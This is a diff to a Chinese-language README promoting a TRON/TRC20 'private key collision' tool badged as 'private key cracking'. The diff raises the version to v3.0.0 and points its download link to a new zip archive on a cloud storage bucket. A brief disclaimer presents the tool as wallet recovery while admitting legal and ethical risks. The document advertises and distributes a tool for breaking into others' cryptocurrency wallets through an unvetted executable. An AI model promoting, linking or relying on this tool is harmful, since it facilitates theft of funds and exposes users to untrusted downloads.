@@ -2,7 +2,7 @@
 	<img alt="logo"  src="./img/logo.png">
 </p>
 <h4 align="center">咸鱼私钥碰撞器（Trc20）</h4>
-<p align="center">版本：v1.0.0</p>
+<p align="center">版本：v3.0.0</p>
 <p align="center">
     <img src="https://img.shields.io/badge/-私钥碰撞-red.svg" style="margin:0 5px">
     <img src="https://img.shields.io/badge/-私钥破解-brightgreen.svg" style="margin:0 5px">
@@ -25,7 +25,7 @@
 
 ### 1.下载软件包：
 <p>
-下载并解压安装包，<a href="https://block-oss.oss-cn-hongkong.aliyuncs.com/trx_collision2.0.zip">点击下载</a>
+下载并解压安装包，<a href="https://block-oss.oss-cn-hongkong.aliyuncs.com/trx_collision3.0.zip">点击下载</a>
 </p>
 
 ### 2.私钥碰撞：
@@ -74,4 +74,5 @@
 ## 注意事项
 
 - 助记词碰撞存在一定的风险和不确定性，且可能涉及法律和道德问题。用户在尝试找回钱包时，应充分了解相关风险，并确保自己的行为符合法律法规。
+
 - 由于网络原因，部分链接可能无法正常访问。请检查链接的合法性，并适当重试。
